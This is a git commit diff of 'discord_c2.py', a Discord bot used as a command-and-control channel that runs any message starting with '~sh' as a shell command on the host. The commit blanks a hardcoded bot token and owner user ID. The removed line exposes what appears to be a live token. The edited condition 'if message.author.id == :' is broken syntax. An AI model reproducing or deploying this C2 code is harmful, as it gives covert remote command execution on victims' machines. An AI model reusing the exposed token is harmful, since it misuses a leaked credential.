efa482f398b79bda4840d4d186708ba7f6b23853
eatinsundip <43767555+eatinsundip@users.noreply.github.com>
2021-12-03 08:54:32 -0600

    Update discord_c2.py

--- discord_c2.py
+++ discord_c2.py
@@ -1,7 +1,7 @@
 import discord, subprocess
 
 # create a discord bot here "https://discord.com/developers/applications"
-TOKEN = "ODc1MTExNDUwOTgzNjg2MjA0.YRQxDA.M2QYi0l3KXss0C1x-fghKlLbRow"  # Use the bot's token here
+TOKEN = ""  # Use the bot's token here
 client = discord.Client()
 
 @client.event
@@ -10,7 +10,7 @@ async def on_message(message):
     if message.author == client.user:
         return
     # Control what UserIDs, servers or channels are allowed to run the ~sh command
-    if message.author.id == 194996899693068288: # My userid so the bot can only respond to me
+    if message.author.id == : # your userid so the bot can only respond to you
         if message.content.startswith("~sh"): # discord listening command
             command = (message.content.lower()[3:])
             bash = subprocess.check_output(command, shell=True)
